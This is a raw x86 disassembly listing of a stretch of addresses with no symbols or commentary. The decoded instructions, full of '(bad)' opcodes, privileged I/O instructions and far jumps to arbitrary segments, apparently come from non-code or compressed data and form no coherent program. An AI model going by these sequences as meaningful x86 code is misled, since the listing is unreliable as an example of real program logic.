  4180cd:	fild   WORD PTR [eax-0x6580be99]
  4180d3:	mov    eax,0x819731aa
  4180d8:	inc    esp
  4180d9:	add    DWORD PTR [ebp+0x69],ebx
  4180dc:	sbb    DWORD PTR [esi-0x6e],eax
  4180df:	sub    DWORD PTR [ebp+0x2545217c],edx
  4180e5:	mov    al,0x74
  4180e7:	and    DWORD PTR [ebp-0x506d10c5],esp
  4180ed:	adc    al,0x10
  4180ef:	(bad)  
  4180f0:	xchg   esi,eax
  4180f1:	and    BYTE PTR [ebp+0x4ca3634a],ah
  4180f7:	int3   
  4180f8:	ins    DWORD PTR es:[edi],dx
  4180f9:	not    ebx
  4180fb:	loop   0x4180c3
  4180fd:	jo     0x418161
  4180ff:	iret   
  418100:	xchg   edx,eax
  418101:	mov    edx,0x75b0262b
  418106:	(bad)  
  418107:	xchg   edx,eax
  418108:	adc    al,bh
  41810a:	and    ebx,esi
  41810c:	xor    eax,DWORD PTR [ecx]
  41810e:	repz loope 0x418107
  418111:	push   es
  418112:	push   ebp
  418113:	dec    edx
  418114:	pop    esi
  418115:	adc    ch,ch
  418117:	sub    eax,0xd26ffc7e
  41811c:	adc    ah,BYTE PTR [ebx-0x5d2d855a]
  418122:	iret   
  418123:	or     esi,eax
  418125:	out    dx,al
  418126:	lea    esi,[ebx-0x7d]
  418129:	cmovs  ebp,DWORD PTR [edx-0x33]
  41812d:	mov    BYTE PTR [ebp-0x16],ah
  418130:	test   DWORD PTR [edi-0x5700daf6],ebx
  418136:	aas    
  418137:	jns    0x418197
  418139:	fnstenv [ebx]
  41813b:	pop    ecx
  41813c:	repnz add eax,0x411a3713
  418142:	add    dl,cl
  418144:	adc    DWORD PTR [ebp+0x6dc455de],0xaef3fd1e
  41814e:	in     al,0x1a
  418150:	fstp   QWORD PTR [ebx]
  418152:	cmp    edi,edi
  418154:	scas   eax,DWORD PTR es:[edi]
  418155:	jo     0x4180e1
  418157:	sub    BYTE PTR [ebp+0x435a4565],dl
  41815d:	xor    DWORD PTR [edi+0x3d1d6f3e],edx
  418163:	jmp    0x127ca2cd
  418168:	sti    
  418169:	repnz mov dh,0xf2
  41816c:	sbb    DWORD PTR [edi],edi
  41816e:	in     al,dx
  41816f:	cwde   
  418170:	inc    esp
  418171:	pop    edi
  418172:	sbb    DWORD PTR [edx],ebx
  418174:	fcmovnu st,st(1)
  418176:	xchg   edx,eax
  418177:	imul   DWORD PTR [esi+0x68]
  41817a:	hlt    
  41817b:	loope  0x4181f8
  41817d:	je     0x4181ef
  41817f:	scas   al,BYTE PTR es:[edi]
  418180:	out    dx,eax
  418181:	jbe    0x41819e
  418183:	mov    cl,0xc3
  418185:	inc    esi
  418186:	pop    esp
  418187:	lds    ebp,FWORD PTR [edx-0x1c]
  41818a:	(bad)  
  41818c:	cmp    edx,DWORD PTR [edi-0x66898019]
  418192:	jge    0x418169
  418194:	add    al,0x3d
  418196:	imul   edx,DWORD PTR [eax],0xa041a4d2
  41819c:	jmp    0xc23479ab
  4181a1:	dec    esi
  4181a2:	test   eax,0xb63aa71e
  4181a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4181a8:	test   eax,0x92e3ba70
  4181ad:	push   es
  4181ae:	out    0xc2,eax
  4181b0:	pop    esp
  4181b1:	inc    esp
  4181b2:	lock xor ch,dl
  4181b5:	(bad)  
  4181b6:	scas   eax,DWORD PTR es:[edi]
  4181b7:	add    bl,BYTE PTR [edi-0x334ca9c2]
  4181bd:	sahf   
  4181be:	retf   0x4b34
  4181c1:	mov    cx,dx
  4181c4:	aad    0x71
  4181c6:	xor    BYTE PTR [ecx+0x1],bl
  4181c9:	das    
  4181ca:	pop    ds
  4181cb:	lods   al,BYTE PTR ds:[esi]
  4181cc:	(bad)  
  4181cd:	in     eax,dx
  4181ce:	cmp    ebp,DWORD PTR [edi+eax*8]
  4181d1:	mov    al,0xa2
  4181d3:	repz lea edi,[edx+0x7c12da07]
  4181da:	icebp  
  4181db:	ins    DWORD PTR es:[edi],dx
  4181dc:	xor    esp,DWORD PTR [edx+0x42]
  4181df:	fisttp DWORD PTR ds:0xd26ac4ac
  4181e5:	stos   DWORD PTR es:[edi],eax
  4181e6:	lods   al,BYTE PTR ds:[esi]
  4181e7:	add    al,0xf1
  4181e9:	(bad)
  4181ed:	pop    eax
  4181ee:	fidiv  WORD PTR [esi+ebx*8+0x75]
  4181f2:	mov    ds,WORD PTR [esi-0x76915fa6]
  4181f8:	inc    DWORD PTR [esi-0x80]
  4181fb:	cmp    ebp,edx
  4181fd:	out    0x3,eax
  4181ff:	mov    al,ds:0x79f9d5f9
  418204:	or     cl,BYTE PTR [esi+0x5e]
  418207:	imul   edi,DWORD PTR [ecx-0x1],0xd7b362a6
  41820e:	dec    ebp
  41820f:	or     BYTE PTR ds:0xa821acae,al
  418215:	loopne 0x418239
  418217:	loope  0x41821f
  418219:	js     0x4181a8
  41821b:	in     al,dx
  41821c:	adc    al,0xc3
  41821e:	shl    BYTE PTR [ecx+esi*2],cl
  418221:	sbb    eax,0x6363b26e
  418226:	push   edi
  418227:	stos   BYTE PTR es:[edi],al
  418228:	(bad)  
  418229:	iret   
  41822a:	mov    cl,0xda
  41822c:	cmc    
  41822d:	(bad)  
  41822e:	dec    esi
  41822f:	xor    bh,BYTE PTR [esi+0x2e]
  418232:	mov    ch,0x3d
  418234:	or     DWORD PTR [esi+esi*1+0x35b2278f],ecx
  41823b:	popf   
  41823c:	shl    DWORD PTR [esi+ebx*2+0x1c],cl
  418240:	xchg   BYTE PTR [ebp+0x19],ah
  418243:	sub    ecx,DWORD PTR [esp+eiz*2]
  418246:	adc    al,BYTE PTR [edi-0x4f31c83b]
  41824c:	fiadd  WORD PTR [esi-0x4f]
  41824f:	and    ebp,DWORD PTR [ecx]
  418251:	lock pop ebx
  418253:	popa   
  418254:	fnstsw WORD PTR [edi-0x37]
  418257:	mov    al,ds:0xd00382f9
  41825c:	jae    0x41828a
  41825e:	or     bh,0xb7
  418261:	sbb    bh,BYTE PTR [ebp-0x63]
  418264:	pop    es
  418265:	scas   al,BYTE PTR es:[edi]
  418266:	loop   0x4182e3
  418268:	fdivr  DWORD PTR [ecx]
  41826a:	jle    0x41828e
  41826c:	repnz sbb eax,0x417b3e37
  418272:	ss repnz or eax,0x67c262f6
  418279:	les    ebx,FWORD PTR [edx+0x46]
  41827c:	dec    eax
  41827d:	push   esp
  41827e:	dec    ecx
  41827f:	cmp    DWORD PTR [ebx-0x6a],0xd6bc19db
  418286:	jmp    0x4182a9
  418288:	pop    ds
  418289:	sub    DWORD PTR [ebp+0x6],esp
  41828c:	push   eax
  41828d:	jmp    0x418248
  41828f:	mov    al,ds:0xa61de32a
  418294:	xchg   ebp,eax
  418295:	jmp    0x469f:0xc6b7653d
  41829c:	call   0xf59ab3b6
  4182a1:	dec    eax
  4182a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4182a3:	or     eax,0x97ba6d16
  4182a8:	push   es
  4182a9:	jns    0x4182e6
  4182ab:	out    dx,al
  4182ac:	and    eax,0x76e9f253
  4182b1:	sti    
  4182b2:	and    eax,0x22ca532f
  4182b7:	dec    ecx
  4182b8:	test   DWORD PTR [esp+ebp*4+0x6214c775],0x28ba691e
  4182c3:	ret    
  4182c4:	call   0x4b65:0x1fb9dfb2
  4182cb:	ret    
  4182cc:	(bad)  
  4182cd:	fstp   DWORD PTR [edi+0x15]
  4182d0:	inc    ecx
  4182d1:	(bad)
  4182d4:	(bad)  
  4182d5:	in     al,0x9f
  4182d7:	or     eax,0xbd09b6df
  4182dc:	mov    dh,0xc1
  4182de:	cmp    eax,0x76642232
  4182e3:	nop
  4182e4:	adc    al,ah
  4182e6:	sbb    esi,DWORD PTR [ebx]
  4182e8:	push   edx
  4182e9:	mov    WORD PTR [esi+0x2fc19206],ds
  4182ef:	std    
  4182f0:	addr16 ja 0x4182b6
  4182f3:	ins    BYTE PTR es:[edi],dx
  4182f4:	pop    ebx
  4182f5:	pop    edi
  4182f6:	call   0x599a6608
  4182fb:	pop    edx
  4182fc:	dec    ebx
  4182fd:	mov    bl,0x37
  4182ff:	xor    bl,BYTE PTR [ecx-0x7a]
  418302:	xor    DWORD PTR [edi],eax
  418304:	and    bl,BYTE PTR [eax-0x3a]
  418307:	jp     0x4182a4
  418309:	fsubr  st(5),st
  41830b:	lods   al,BYTE PTR ds:[esi]
  41830c:	loop   0x4182bf
  41830e:	adc    BYTE PTR [ebx],dl
  418310:	add    ebp,DWORD PTR [ebp-0x6d]
  418313:	shr    BYTE PTR [ecx-0x3f80287a],0x5a
  41831a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41831b:	add    eax,DWORD PTR [edx-0x15a613d4]
  418321:	in     eax,0x80
  418323:	sar    bl,0x7f
  418326:	mov    ecx,0x3276f77d
  41832b:	dec    edx
  41832c:	rcr    DWORD PTR [ebp-0x3ce0035f],cl
  418332:	add    edx,DWORD PTR [ebx]
  418334:	jp     0x418340
  418336:	in     al,dx
  418337:	mov    ah,0x80
  418339:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41833a:	mov    ds:0xd306ea05,al
  41833f:	and    al,0x72
  418341:	cmp    ebp,DWORD PTR [ecx-0x5792a147]
  418347:	ins    DWORD PTR es:[edi],dx
  418348:	push   esi
  418349:	div    BYTE PTR [ebx]
  41834b:	pop    ss
  41834c:	jge    0x41838b
  41834e:	lds    eax,FWORD PTR ds:0x2b425be3
  418354:	pushf  
  418355:	dec    esi
  418356:	and    BYTE PTR [esi],al
  418358:	mov    ah,0x1b
  41835a:	popa   
  41835b:	xor    ebx,DWORD PTR [edi]
  41835d:	pop    esp
  41835e:	adc    al,0xb5
  418360:	jo     0x4183b9
  418362:	shl    DWORD PTR [esi],cl
  418364:	das    
  418365:	jnp    0x418342
  418367:	rol    DWORD PTR [ebx+0x3b],1
  41836a:	pop    ss
  41836b:	vminss xmm5,xmm0,xmm4
  41836f:	icebp  
  418370:	jg     0x418315
  418372:	sub    eax,0x1cf521f
  418377:	ret    
  418378:	mov    ebx,0x84d355e8
  41837d:	addr16 pop ebx
  41837f:	jl     0x418357
  418381:	push   eax
  418382:	cmc    
  418383:	mov    ds:0x78fb355b,al
  418388:	adc    eax,DWORD PTR [ecx]
  41838a:	call   0x8ee7:0xcae0e507
  418391:	mov    edx,0xf38df753
  418396:	lods   eax,DWORD PTR ds:[esi]
  418397:	js     0x41832d
  418399:	pop    ebx
  41839a:	outs   dx,DWORD PTR ds:[esi]
  41839b:	test   eax,ebp
  41839d:	mov    DWORD PTR [esi+0x6a],edi
  4183a0:	ret    0xd59e
  4183a3:	inc    ebp
  4183a4:	mov    esp,0x6ab746ab
  4183a9:	cmc    
  4183aa:	adc    BYTE PTR [eax],dh
  4183ac:	and    al,0x26
  4183ae:	pop    ss
  4183af:	jmp    0xd3a1:0xca041063
  4183b6:	add    eax,0x9763228c
  4183bb:	cli    
  4183bc:	call   0x2581:0xc26c87e3
  4183c3:	loop   0x418441
  4183c5:	ret    0x25eb
  4183c8:	fistp  DWORD PTR [ecx]
  4183ca:	dec    BYTE PTR [ebp+0x4d]
  4183cd:	mov    WORD PTR [edi],?
  4183cf:	das    
  4183d0:	sub    bl,BYTE PTR [esi+edx*2+0x75700065]
  4183d7:	mov    ecx,edi
  4183d9:	xchg   DWORD PTR [edi-0x5c6ece82],edi
  4183df:	icebp  
  4183e0:	jle    0x41837d
  4183e2:	dec    DWORD PTR [ecx+eiz*2-0x73]
  4183e6:	dec    dl
  4183e8:	cld    
  4183e9:	rcr    DWORD PTR [ebx-0xa],0xe5
  4183ed:	mov    ebx,0xf0cbf620
  4183f2:	out    0xab,eax
  4183f4:	fwait
  4183f5:	dec    esp
  4183f6:	stc    
  4183f7:	inc    ebp
  4183f8:	push   0xffffffcb
  4183fa:	sti    
  4183fb:	int3   
  4183fc:	mov    ebx,0xeabbbfd0
  418401:	mov    DWORD PTR [edi-0x2e],esi
  418404:	xor    BYTE PTR [ecx],bh
  418406:	pushf  
  418407:	push   edi
  418408:	inc    edi
  418409:	dec    ecx
  41840a:	xchg   esi,eax
  41840b:	inc    ebp
  41840c:	aaa    
  41840d:	cmp    eax,DWORD PTR [edx]
  41840f:	stc    
  418410:	jne    0x418464
  418412:	add    BYTE PTR [ecx+0x6dc5bff1],bh
  418418:	adc    BYTE PTR [edi+0x5a],dh
  41841b:	lods   eax,DWORD PTR ds:[esi]
  41841c:	lea    esp,[esp+eax*1-0x4d]
  418420:	cs imul bh
  418423:	inc    edx
  418424:	fisubr DWORD PTR [edx]
  418426:	test   BYTE PTR [edi+0x2d],bl
  418429:	push   ecx
  41842a:	pusha  
  41842b:	mul    bh
  41842d:	fucomip st,st(1)
  41842f:	jecxz  0x4183e9
  418431:	lahf   
  418432:	test   al,0x89
  418434:	mov    edi,DWORD PTR [eax]
  418436:	(bad)  
  418437:	(bad)  
  418439:	int    0xf7
  41843b:	sub    BYTE PTR [eax+0x38d7672f],ah
  418441:	jae    0x418459
  418443:	jne    0x418441
  418445:	(bad)
  418448:	dec    ebp
  418449:	cmp    BYTE PTR [ebx-0x600266d3],0x4f
  418450:	aas    
  418451:	loopne 0x418474
  418453:	xchg   DWORD PTR [eax+0x78],edi
  418456:	xchg   ebx,eax
  418457:	jge    0x418499
  418459:	pop    eax
  41845a:	push   ebp
  41845b:	xchg   esp,eax
  41845c:	xchg   esp,eax
  41845d:	pop    es
  41845e:	add    BYTE PTR [ecx+0x3f],0x45
  418462:	mov    ds:0x77989ec9,eax
  418467:	mov    bl,0xec
  418469:	in     eax,dx
  41846a:	xchg   DWORD PTR [ebx+0x1957ac5e],ecx
  418470:	mov    bh,0xa9
  418472:	test   DWORD PTR [ecx+0x7],0x8573354c
  418479:	in     eax,0x52
  41847b:	ret    0x70bd
  41847e:	jne    0x4184e3
  418480:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418481:	add    eax,0xcdc4ae3f
  418486:	mov    esp,DWORD PTR [ecx-0xf]
  418489:	adc    al,0xf6
  41848b:	xor    DWORD PTR [ebp+esi*8-0x1b701432],ebx
  418492:	je     0x4184ae
  418494:	xor    edi,DWORD PTR [eax-0x783abeb5]
  41849a:	sbb    eax,0x792c68d6
  41849f:	mov    ah,0xc7
  4184a1:	jne    0x41843b
  4184a3:	aas    
  4184a4:	xor    DWORD PTR [ecx-0x19b05392],eax
  4184aa:	dec    edx
  4184ab:	pop    eax
  4184ac:	je     0x4184d3
  4184ae:	pop    ebx
  4184af:	xor    edx,DWORD PTR [edx]
  4184b1:	inc    edi
  4184b2:	or     al,0x57
  4184b4:	popa   
  4184b5:	jbe    0x4184b8
  4184b7:	or     bh,BYTE PTR [ebx-0x4]
  4184ba:	fwait
  4184bb:	inc    eax
  4184bc:	fwait
  4184bd:	pushf  
  4184be:	sub    WORD PTR fs:0xeb162d36,0xff87
  4184c7:	popa   
  4184c8:	test   BYTE PTR [eax+eax*8-0x7f086772],bl
  4184cf:	repnz adc bh,BYTE PTR ds:0xa144adfc
  4184d6:	ss push es
  4184d8:	dec    ebp
  4184d9:	repnz or ebp,DWORD PTR [ecx+0x2]
  4184dd:	mov    BYTE PTR [ecx-0x2d],0xb7
  4184e1:	sbb    al,0xa0
  4184e3:	outs   dx,DWORD PTR ds:[esi]
  4184e4:	push   ss
  4184e5:	xor    eax,0x1668b24c
  4184ea:	pop    edi
  4184eb:	add    ch,BYTE PTR [ebx-0x4b]
  4184ee:	add    BYTE PTR [ecx+0x116ddc18],bl
  4184f4:	xchg   ebx,eax
  4184f5:	cld    
  4184f6:	jne    0x4184a1
  4184f8:	add    DWORD PTR [ecx-0x6e00925a],ecx
  4184fe:	adc    al,0xa7
  418500:	sub    BYTE PTR [ecx+0x4e3cefd6],cl
  418506:	fstp   DWORD PTR [edx+ebx*2+0x792d584c]
  41850d:	xchg   esi,eax
  41850e:	mov    eax,0x518966ea
  418513:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418514:	jmp    0x96c5d146
  418519:	push   es
  41851a:	call   0x1bac:0x762f9c0
  418521:	mov    al,ds:0x47d4519c
  418526:	(bad)  
  418527:	aad    0xf9
  418529:	push   es
  41852a:	mov    DWORD PTR [ecx+0x3d],edi
  41852d:	dec    ecx
  41852e:	add    al,0x5e
  418530:	pop    ss
  418531:	jo     0x418563
  418533:	push   ecx
  418534:	mov    ah,0xdd
  418536:	ins    DWORD PTR es:[edi],dx
  418537:	aad    0x4a
  418539:	or     BYTE PTR [ecx],bl
  41853b:	jl     0x418533
  41853d:	(bad)  
  41853e:	xchg   edx,eax
  41853f:	jg     0x4184f2
  418541:	mov    eax,ecx
  418543:	pop    eax
  418544:	jnp    0x41855e
  418546:	xchg   edi,eax
  418547:	repnz mov esp,0x6b3675c3
  41854d:	pop    esi
  41854e:	aaa    
  41854f:	adc    BYTE PTR [edi+0x1c],dl
  418552:	xchg   ecx,eax
  418553:	and    BYTE PTR [edx-0x1e7928f],al
  418559:	fimul  WORD PTR [eax-0x3f]
  41855c:	imul   ebx,ebp,0xffffffea
  41855f:	mov    ebx,0x1b5add87
  418564:	stos   BYTE PTR es:[edi],al
  418565:	sbb    DWORD PTR fs:[eax],esi
  418568:	push   ds
  418569:	stos   BYTE PTR es:[edi],al
  41856a:	xchg   esp,eax
  41856b:	fbld   TBYTE PTR [edx+edx*4]
  41856e:	lea    ebx,[ebx+ecx*2-0x17]
  418572:	jnp    0x418553
  418574:	scas   eax,DWORD PTR es:[edi]
  418575:	aam    0x8d
  418577:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418578:	aam    0x2
  41857a:	ins    DWORD PTR es:[edi],dx
  41857b:	(bad)  
  41857c:	call   0xd7cfe6e5
  418581:	sub    edx,DWORD PTR [esi]
  418583:	cdq    
  418584:	xchg   ebx,eax
  418585:	xchg   esp,eax
  418586:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418587:	scas   al,BYTE PTR es:[edi]
  418588:	sub    al,BYTE PTR [esi-0x70ab3fe]
  41858e:	xchg   dh,dl
  418590:	adc    ebp,DWORD PTR [esi-0x5c00652e]
  418596:	cmp    al,0x2f
  418598:	add    al,0x65
  41859a:	add    BYTE PTR gs:[ebx+0x4dd57847],al
  4185a1:	mov    bh,0x13
  4185a3:	sbb    al,0xc2
  4185a5:	mov    dh,0xec
  4185a7:	push   0x5fdc81f9
  4185ac:	pusha  
  4185ad:	push   ebx
  4185ae:	mov    esi,0x30af31f3
  4185b3:	xor    eax,0xbf791c54
  4185b8:	push   ecx
  4185b9:	nop
  4185ba:	in     eax,dx
  4185bb:	add    dl,BYTE PTR [esi+edi*8+0x1f]
  4185bf:	pop    ds
  4185c0:	push   edi
  4185c1:	fisub  DWORD PTR [ecx-0x3f618466]
  4185c7:	imul   eax,DWORD PTR [eax],0x6f
  4185ca:	pop    esp
  4185cb:	xchg   DWORD PTR [esi+0x11d22c8c],esi
  4185d1:	and    BYTE PTR ds:0x8f4b7f7f,ch
  4185d7:	gs dec esp
  4185d9:	in     eax,0x4f
  4185db:	jno    0x4185fc
  4185dd:	mov    bl,0xa8
  4185df:	push   ebp
  4185e0:	std    
  4185e1:	fwait
  4185e2:	push   ds
  4185e3:	add    DWORD PTR [esi-0x47],edx
  4185e6:	out    dx,eax
  4185e7:	popf   
  4185e8:	loop   0x4185fc
  4185ea:	or     al,0x7d
  4185ec:	aaa    
  4185ed:	or     edi,DWORD PTR [edi+0x3664a0b4]
  4185f3:	rcl    BYTE PTR [eax+0x13],1
  4185f6:	push   0xffffff91
  4185f8:	adc    eax,0x956ddb7a
  4185fd:	stc    
  4185fe:	jae    0x4185ae
  418600:	jecxz  0x4185c9
  418602:	data16 xlat BYTE PTR ds:[ebx]
  418604:	(bad)  
  418606:	call   0x9d55:0xa20db3c1
  41860d:	mov    esp,0x3f6866e9
  418612:	and    eax,0x4327a651
  418617:	out    dx,eax
  418618:	adc    BYTE PTR [edx-0x27],ch
  41861b:	mov    ah,0xb4
  41861d:	jg     0x418670
  41861f:	jle    0x418656
  418621:	mov    eax,ds:0x27a16393
  418626:	(bad)  
  418627:	lods   al,BYTE PTR ds:[esi]
  418628:	adc    BYTE PTR [ebx*1+0x35623b14],bh
  41862f:	mov    BYTE PTR [eax+0x6ac793a6],ah
  418635:	fld    TBYTE PTR [edx-0x2e30a7d4]
  41863b:	inc    ebp
  41863c:	outs   dx,BYTE PTR ds:[esi]
  41863d:	(bad)  
  41863e:	ss push ss
  418640:	aam    0xdb
  418642:	(bad)  
  418643:	rcl    DWORD PTR [esi+0x6dda86af],1
  418649:	jp     0x418650
  41864b:	dec    ebp
  41864c:	in     al,dx
  41864d:	add    al,0x5a
  41864f:	hlt    
  418650:	jge    0x41864c
  418652:	mov    cl,0x25
  418654:	xchg   DWORD PTR [esi],edx
  418656:	sbb    BYTE PTR [eax+ebp*2+0x403dfd7b],bl
  41865d:	mov    WORD PTR [eax+ebx*4-0x60],?
  418661:	fild   QWORD PTR [eax]
  418663:	imul   edi,DWORD PTR ss:[ebp+0x96b0bff],0xf1e9d7fc
  41866e:	and    bl,bh
  418670:	inc    ecx
  418671:	jp     0x4185f9
  418673:	or     eax,0x597ec9b1
  418678:	enter  0x3167,0xfd
  41867c:	sbb    al,0xde
  41867e:	nop
  41867f:	mov    bl,0x74
  418681:	sbb    DWORD PTR [esi-0x649a5491],esi
  418687:	imul   eax,edx,0x2f
  41868a:	lods   eax,DWORD PTR gs:[esi]
  41868c:	mov    edx,0xf23b83c2
  418691:	icebp  
  418692:	js     0x418636
  418694:	mov    ds:0x4129ed64,eax
  41869a:	jmp    0x17f3:0xdf8bb80e
  4186a1:	stos   BYTE PTR es:[edi],al
  4186a2:	mov    al,ds:0x428f1d6
  4186a7:	(bad)  
  4186a8:	xlat   BYTE PTR ds:[ebx]
  4186a9:	xchg   edi,eax
  4186aa:	xor    edx,ebp
  4186ac:	aam    0xdd
  4186ae:	mov    bh,cl
  4186b0:	(bad)  
  4186b1:	int3   
  4186b2:	adc    DWORD PTR [edx+0x4e],ebp
  4186b5:	stos   DWORD PTR es:[edi],eax
  4186b6:	push   ecx
  4186b7:	enter  0x62a1,0x8
  4186bb:	adc    eax,0xa4fb5bb1
  4186c0:	dec    esp
  4186c1:	outs   dx,BYTE PTR ds:[esi]
  4186c2:	jno    0x41868e
  4186c4:	stos   BYTE PTR es:[edi],al
  4186c5:	pop    ebp
  4186c6:	push   edi
  4186c7:	neg    DWORD PTR [ecx+0x2a]
  4186ca:	ficomp DWORD PTR [edi+0x45]
  4186cd:	scas   eax,DWORD PTR es:[edi]
  4186ce:	imul   edi,edx,0x1b
  4186d1:	pop    es
  4186d2:	outs   dx,BYTE PTR ds:[esi]
  4186d3:	push   ds
  4186d4:	pop    DWORD PTR [eax+eax*4+0x18]
  4186d8:	push   ebx
  4186d9:	cli    
  4186da:	jecxz  0x4186b5
  4186dc:	cmp    BYTE PTR [ebp-0x65683623],dh
  4186e2:	call   DWORD PTR [ecx+ebp*1]
  4186e5:	or     eax,0xce4f4e44
  4186ea:	fidivr DWORD PTR ds:0x134b22b7
  4186f0:	ds lock dec ebx
  4186f3:	sbb    eax,0x5e6e4e30
  4186f8:	dec    edx
  4186f9:	or     eax,0x4ca34f00
  4186fe:	inc    BYTE PTR [eax+0x16]
  418701:	jmp    0xf873:0x217eaf96
  418708:	push   eax
  418709:	or     bh,cl
  41870b:	sub    al,0xd3
  41870d:	inc    ebx
  41870e:	jge    0x41877d
  418710:	ficom  WORD PTR [ebp+0x30]
  418713:	icebp  
  418714:	sar    DWORD PTR [esi+0x72fc8ca9],1
  41871a:	fst    DWORD PTR [eax+0x37bee0f6]
  418720:	sbb    eax,0x2f6a12bb
  418725:	mov    ebx,esi
  418727:	aaa    
  418728:	popf   
  418729:	jns    0x418735
  41872b:	mov    dh,0xaf
  41872d:	jmp    0x2094:0x12567c52
  418734:	outs   dx,BYTE PTR ds:[esi]
  418735:	(bad)  
  418736:	adc    eax,0x873edd42
  41873b:	es mov al,ch
  41873e:	cmp    BYTE PTR [ecx+0x53f1e0de],bh
  418744:	dec    ebp
  418745:	icebp  
  418746:	loop   0x4187a3
  418748:	jge    0x4186f6
  41874a:	adc    eax,DWORD PTR [ebx]
  41874c:	sti    
  41874d:	mov    al,0xe5
  41874f:	(bad)  
  418750:	sbb    al,0x22
  418752:	sbb    al,BYTE PTR [edx]
  418754:	or     eax,0xfbd7bcd4
  418759:	dec    ebp
  41875a:	xchg   esp,eax
  41875b:	out    0xf,al
  41875d:	scas   al,BYTE PTR es:[edi]
  41875e:	pop    ebx
  41875f:	jmp    0x76d08617
  418764:	cmp    dh,BYTE PTR [edi]
  418766:	sub    DWORD PTR [esi+0x419e3646],ecx
  41876c:	pop    ebp
  41876d:	inc    edx
  41876e:	xchg   ecx,eax
  41876f:	fcom   DWORD PTR [edi-0x32]
  418772:	ins    BYTE PTR es:[edi],dx
  418773:	stc    
  418774:	dec    edx
  418775:	rol    BYTE PTR [eax],0x34
  418778:	outs   dx,DWORD PTR ds:[esi]
  418779:	bound  esp,QWORD PTR [esi]
  41877b:	jg     0x418762
  41877d:	and    BYTE PTR [edx-0xe],cl
  418780:	ss xchg edi,eax
  418782:	ja     0x41873c
  418784:	fist   WORD PTR [ebx+0x766387fe]
  41878a:	xchg   edi,eax
  41878b:	scas   al,BYTE PTR es:[edi]
  41878c:	pop    ds
  41878d:	sbb    al,0xf6
  41878f:	xchg   BYTE PTR [edx-0x2e],dh
  418792:	push   ss
  418793:	scas   al,BYTE PTR es:[edi]
  418794:	xchg   ecx,eax
  418795:	rcl    BYTE PTR [ecx-0x441bebfb],cl
  41879b:	sub    DWORD PTR [edx-0x684a9aa4],esp
  4187a1:	and    bl,BYTE PTR [edx-0x6783b547]
  4187a7:	jp     0x41880f
  4187a9:	pop    edx
  4187aa:	inc    esi
  4187ab:	enter  0xf354,0x66
  4187af:	inc    ebx
  4187b0:	dec    edi
  4187b1:	mov    ds:0xeb088671,eax
  4187b6:	ins    BYTE PTR es:[edi],dx
  4187b7:	retf   0x822b
  4187ba:	sti    
  4187bb:	push   esi
  4187bc:	xchg   DWORD PTR [edi],esp
  4187be:	push   edx
  4187bf:	les    ebx,FWORD PTR [ecx-0xf]
  4187c2:	(bad)  [si-0x2586]
  4187c7:	in     al,dx
  4187c8:	xchg   BYTE PTR [esi],ch
  4187ca:	out    0xaf,al
  4187cc:	shr    ch,1
  4187ce:	ins    BYTE PTR es:[edi],dx
  4187cf:	ret    0x4ee1
  4187d2:	jbe    0x418833
  4187d4:	das    
  4187d5:	xor    edx,0xbebe2c0e
  4187db:	pushf  
  4187dc:	xor    al,0x41
  4187de:	and    DWORD PTR [ebx-0x4a789416],esp
  4187e4:	popf   
  4187e5:	stos   DWORD PTR es:[edi],eax
  4187e6:	xchg   BYTE PTR ds:0x76646757,dl
  4187ec:	std    
  4187ed:	leave  
  4187ee:	or     DWORD PTR [eax-0x72],eax
  4187f1:	jl     0x41882b
  4187f3:	xchg   edi,eax
  4187f4:	jge    0x418841
  4187f6:	sbb    BYTE PTR [esi-0x6882d039],ah
  4187fc:	cli    
  4187fd:	inc    esp
  4187fe:	xchg   DWORD PTR [ecx],esp
  418800:	sub    bh,BYTE PTR [ebp-0x2b5e4d19]
  418806:	xor    ecx,DWORD PTR [ebx-0x43]
  418809:	cmp    DWORD PTR [esi-0x65b8bcca],edx
  41880f:	mov    cl,BYTE PTR [eax+0x2e7958de]
  418815:	xchg   esi,eax
  418816:	js     0x418843
  418818:	pop    ds
  418819:	push   ebp
  41881a:	addr16 sub ecx,esp
  41881d:	push   ecx
  41881e:	mov    WORD PTR [eax-0x3d],es
  418821:	cwde   
  418822:	and    edx,DWORD PTR [ebx-0x2]
  418825:	push   0xffffff91
  418827:	xor    esp,DWORD PTR [esp+edx*8+0x40c112bf]
  41882e:	xor    DWORD PTR [ebp-0x12],ebp
  418831:	ret    0xfabd
  418834:	sub    eax,0x9b37c412
  418839:	cdq    
  41883a:	mov    ebx,0x4441daa5
  41883f:	sub    dl,dh
  418841:	add    DWORD PTR [ebp-0x71],ebp
  418844:	wbinvd 
  418846:	push   ebx
  418847:	ins    BYTE PTR es:[edi],dx
  418848:	icebp  
  418849:	gs sbb esi,ebp
  41884c:	call   0x8ddb:0xe242839d
  418853:	and    BYTE PTR [esi],dl
  418855:	sub    DWORD PTR [ecx-0x72874b8],edx
  41885b:	dec    eax
  41885c:	shl    DWORD PTR [ebp-0x19ee6c52],0x5c
  418863:	mov    al,0x1c
  418865:	mov    eax,0xfbf3facb
  41886a:	push   edx
  41886b:	xchg   edx,eax
  41886c:	lds    ebx,FWORD PTR [esi]
  41886e:	mov    ecx,0x3cf4d3c5
  418873:	call   DWORD PTR [ebp-0x5a]
  418876:	or     al,0xee
  418878:	add    dh,al
  41887a:	cmp    al,0x78
  41887c:	xor    BYTE PTR [eax-0x71],cl
  41887f:	outs   dx,BYTE PTR ds:[esi]
  418880:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418881:	adc    ecx,DWORD PTR [edx+eiz*2+0x4]
  418885:	dec    ebx
  418886:	into   
  418887:	rcl    DWORD PTR [eax+0x33],cl
  41888a:	jb     0x418883
  41888c:	stos   BYTE PTR es:[edi],al
  41888d:	in     al,0xf6
  41888f:	ins    BYTE PTR es:[edi],dx
  418890:	sbb    ch,BYTE PTR [edx]
  418892:	shr    DWORD PTR [esi],0xc8
  418895:	xor    eax,0xffffffd7
  418898:	push   esi
  418899:	xchg   ecx,eax
  41889a:	popf   
  41889b:	jg     0x41883c
  41889d:	out    dx,al
  41889e:	clc    
  41889f:	lods   al,BYTE PTR ds:[esi]
